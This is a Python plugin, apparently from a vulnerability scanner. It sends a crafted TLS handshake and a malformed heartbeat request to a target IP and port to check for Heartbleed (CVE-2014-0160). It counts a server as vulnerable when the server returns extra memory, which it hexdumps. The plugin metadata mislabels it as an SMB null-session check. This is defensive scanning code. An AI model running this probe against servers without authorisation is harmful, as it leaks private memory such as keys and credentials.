#https://gist.github.com/akshatmittal/10279360
import json
from datetime import datetime
import socket

from ....utils import TestResult, UniversalEncoder, h2bin, hexdump
from ..httpsutils import ssl_recvmsg

hello = h2bin('''
		16 03 02 00  dc 01 00 00 d8 03 02 53
		43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
		bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
		00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
		00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
		c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
		c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
		c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
		c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
		00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
		03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
		00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
		00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
		00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
		00 0f 00 01 01								  
		''')
 
hb = h2bin(''' 
		18 03 02 00 03
		01 40 00
		''')

class HTTPS001PluginDef():
	def __init__(self):
		self.classname        = 'HTTPS001'
		self.version          = '0.1'
		self.triggerPorts     = '443'
		self.shortname        = 'HTTPS Heartbleed'
		self.name             = 'SMB null session info gathering'
		self.CVE_score        = 5
		self.shortdescription = 'cve-2014-0160'
		self.longdescription  = ''
		self.resolution       = ''

class HTTPS001():
	def __init__(self, target = None, timeout = 1):
		self.plugindef       = HTTPS001PluginDef()
		self.target          = target
		self.testresult      = TestResult.NOTSTARTED
		self.error_reason    = None
		self.tested_at       = None
		#socket parameters
		self.soc_timeout     = timeout
		self.synopsis        = None

		
	def test(self):
		self.testresult = TestResult.STARTED
		self.tested_at  = datetime.utcnow()
		try:
		 
			soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			soc.connect(self.target.getaddr())	
			soc.sendall(hello)
			while True:
				typ, ver, pay, desc = ssl_recvmsg(soc, self.soc_timeout)
				if typ == None:
					self.testresult = TestResult.ERROR
					self.error_reason = 'Server closed connection without sending Server Hello.'
					return
				# Look for server hello done message.
				if typ == 22 and pay[0] == 0x0E:
					break
		 
			soc.sendall(hb)
			while True:
				typ, ver, pay, desc = ssl_recvmsg(soc, self.soc_timeout)
				if typ is None:
					self.testresult = TestResult.NOTVULNERABLE
					self.synopsis =  'No heartbeat response received, server likely not vulnerable'
					return False
		 
				if typ == 24:
					if len(pay) > 3:
						self.synopsis = 'Server returned more data than it should - server is vulnerable!\r\n' + hexdump(pay)
						self.testresult = TestResult.VULNERABLE
					else:
						self.synopsis = 'Server processed malformed heartbeat, but did not return any extra data.\r\n' + hexdump(pay)
						self.testresult = TestResult.NOTVULNERABLE
					return True
		 
				if typ == 21:
					self.synopsis =  'Received alert:' + hexdump(pay)
					self.testresult = TestResult.NOTVULNERABLE
					return False
				
		except Exception as e:
			self.testresult = TestResult.ERROR
			self.error_reason = str(e)
	
	def toJSON(self):
		return json.dumps(self.toDict(), cls = UniversalEncoder)
			
	def toDict(self):
		t = {}
		t['target']          = self.target.toDict()
		t['testresult']      = self.testresult
		t['error_reason']    = self.error_reason
		t['tested_at']       = self.tested_at
		t['soc_timeout']     = self.soc_timeout
		return t
		

		
		
if __name__ == '__main__':
	from ....utils import DummyTarget
	import argparse
	
	parser = argparse.ArgumentParser('Test for SSL heartbeat vulnerability (CVE-2014-0160)')
	parser.add_argument("ip", help="Target IP address")
	parser.add_argument("port", type=int, help="Target port")
	parser.add_argument("-t", "--timeout", type=int, default = 5, help="Timeout")
	
	args = parser.parse_args()
	
	t = DummyTarget(args.ip,args.port)
	
	vuln = HTTPS001(t, timeout =  args.timeout)
	vuln.test()
	print(vuln.toJSON())
	